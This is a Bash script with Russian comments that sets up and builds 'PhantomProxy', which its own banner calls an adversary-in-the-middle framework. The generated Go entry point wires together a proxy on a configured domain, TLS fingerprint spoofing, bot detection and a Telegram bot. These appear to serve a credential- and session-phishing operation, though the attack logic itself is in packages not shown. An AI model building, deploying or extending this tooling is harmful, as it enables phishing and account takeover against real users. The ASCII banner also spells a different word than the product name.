#!/bin/bash
# Скрипт установки PhantomProxy на VPS

echo "🚀 Установка PhantomProxy на VPS..."

# Переход в директорию
cd ~/phantom-proxy || exit

# Загрузка go.mod и go.sum
echo "📦 Загрузка зависимостей..."
cat > go.mod << 'EOF'
module github.com/phantom-proxy/phantom-proxy

go 1.21

require (
	github.com/fatih/color v1.16.0
	github.com/google/uuid v1.6.0
	github.com/gofiber/fiber/v2 v2.52.11
	github.com/gorilla/websocket v1.5.1
	github.com/mattn/go-sqlite3 v1.14.22
	github.com/playwright-community/playwright-go v0.5200.1
	github.com/quic-go/quic-go v0.44.0
	github.com/refraction-networking/utls v1.8.1
	github.com/spf13/viper v1.18.2
	github.com/stretchr/testify v1.9.0
	go.uber.org/zap v1.27.0
	golang.org/x/net v0.20.0
	gopkg.in/telebot.v3 v3.3.8
	gopkg.in/yaml.v3 v3.0.1
)
EOF

# Создание main.go
echo "📝 Создание main.go..."
mkdir -p cmd/phantom-proxy

cat > cmd/phantom-proxy/main.go << 'MAINEOF'
package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"syscall"

	"github.com/fatih/color"
	"go.uber.org/zap"
	"go.uber.org/zap/zapcore"

	"github.com/phantom-proxy/phantom-proxy/internal/config"
	"github.com/phantom-proxy/phantom-proxy/internal/database"
	"github.com/phantom-proxy/phantom-proxy/internal/proxy"
	"github.com/phantom-proxy/phantom-proxy/internal/api"
	"github.com/phantom-proxy/phantom-proxy/internal/ml"
	"github.com/phantom-proxy/phantom-proxy/internal/telegram"
	tls_spoof "github.com/phantom-proxy/phantom-proxy/internal/tls"
)

const (
	Version = "1.0.0-dev"
	Banner  = `
██████╗  ██████╗ ██╗     ██╗     ██╗███╗   ██╗ ██████╗ 
██╔══██╗██╔═══██╗██║     ██║     ██║████╗  ██║██╔════╝ 
██████╔╝██║   ██║██║     ██║     ██║██╔██╗ ██║██║  ███╗
██╔═══╝ ██║   ██║██║     ██║     ██║██║╚██╗██║██║   ██║
██║     ╚██████╔╝███████╗███████╗██║██║ ╚████║╚██████╔╝
╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 

PhantomProxy v%s - AitM Framework Next Generation
`
)

func main() {
	configPath := flag.String("config", "config.yaml", "Путь к конфигурационному файлу")
	debug := flag.Bool("debug", false, "Режим отладки")
	version := flag.Bool("version", false, "Показать версию")
	
	flag.Parse()
	
	if *version {
		fmt.Printf("PhantomProxy v%s\n", Version)
		os.Exit(0)
	}
	
	color.Cyan(Banner, Version)
	
	logger, err := initLogger(*debug)
	if err != nil {
		color.Red("[!] Failed to initialize logger: %v", err)
		os.Exit(1)
	}
	defer logger.Sync()
	
	logger.Info("Starting PhantomProxy...", zap.String("version", Version))
	
	cfg, err := config.Load(*configPath)
	if err != nil {
		logger.Fatal("Failed to load config", zap.Error(err))
	}
	
	if *debug {
		cfg.Debug = true
	}
	
	logger.Info("Config loaded", 
		zap.String("domain", cfg.Domain),
		zap.Int("https_port", cfg.HTTPSPort),
		zap.Bool("debug", cfg.Debug))
	
	db, err := database.NewDatabase(cfg.DatabasePath)
	if err != nil {
		logger.Fatal("Failed to initialize database", zap.Error(err))
	}
	defer db.Close()
	
	logger.Info("Database initialized", zap.String("path", cfg.DatabasePath))
	
	tlsManager := tls_spoof.NewSpoofManager()
	logger.Info("TLS Spoof Manager initialized")
	
	httpProxy, err := proxy.NewHTTPProxy(cfg, db, tlsManager, logger)
	if err != nil {
		logger.Fatal("Failed to create HTTP proxy", zap.Error(err))
	}
	
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	
	sigChan := make(chan os.Signal, 2)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	
	go func() {
		<-sigChan
		logger.Info("Shutdown signal received")
		cancel()
	}()
	
	logger.Info("Starting HTTP/HTTPS proxy", 
		zap.String("bind", cfg.BindIP),
		zap.Int("port", cfg.HTTPSPort))
	
	go func() {
		if err := httpProxy.Start(ctx); err != nil {
			logger.Error("HTTP proxy error", zap.Error(err))
		}
	}()
	
	if cfg.APIEnabled {
		apiServer := api.NewAPIServer(httpProxy, db, logger, cfg.APIKey)
		
		logger.Info("Starting API server",
			zap.Int("port", cfg.APIPort))
		
		go func() {
			addr := fmt.Sprintf("%s:%d", cfg.BindIP, cfg.APIPort)
			if err := apiServer.Start(addr); err != nil {
				logger.Error("API server error", zap.Error(err))
			}
		}()
	}
	
	if cfg.MLDetection {
		_ = ml.NewRuleBasedDetector(logger, cfg.MLThreshold)
		logger.Info("ML Bot Detector initialized (rule-based)",
			zap.Float32("threshold", cfg.MLThreshold))
	}
	
	if cfg.TelegramEnabled && cfg.TelegramToken != "" {
		tgConfig := &telegram.Config{
			Token:   cfg.TelegramToken,
			ChatID:  cfg.TelegramChatID,
			Enabled: true,
		}
		tgBot, err := telegram.NewBot(tgConfig, db, logger)
		if err != nil {
			logger.Error("Failed to initialize Telegram bot", zap.Error(err))
		} else {
			if err := tgBot.Start(ctx); err != nil {
				logger.Error("Telegram bot error", zap.Error(err))
			}
		}
	}
	
	<-ctx.Done()
	
	logger.Info("PhantomProxy stopped")
	color.Green("\n[*] Shutdown complete")
}

func initLogger(debug bool) (*zap.Logger, error) {
	cfg := zap.NewProductionConfig()
	
	if debug {
		cfg.Level = zap.NewAtomicLevelAt(zap.DebugLevel)
		cfg.EncoderConfig.EncodeTime = zapcore.ISO8601TimeEncoder
		cfg.EncoderConfig.EncodeLevel = zapcore.CapitalColorLevelEncoder
	}
	
	return cfg.Build()
}
MAINEOF

echo "⚙️ Сборка PhantomProxy..."
go mod tidy
go build -o phantom-proxy ./cmd/phantom-proxy

if [ -f phantom-proxy ]; then
    echo "✅ Сборка успешна!"
    ./phantom-proxy -version
else
    echo "❌ Ошибка сборки!"
    exit 1
fi

echo ""
echo "📋 Для запуска выполните:"
echo "   cd ~/phantom-proxy"
echo "   ./phantom-proxy -config config.yaml -debug"
echo ""
echo "📖 Документация: TEST_VERDEBUDGET.md"
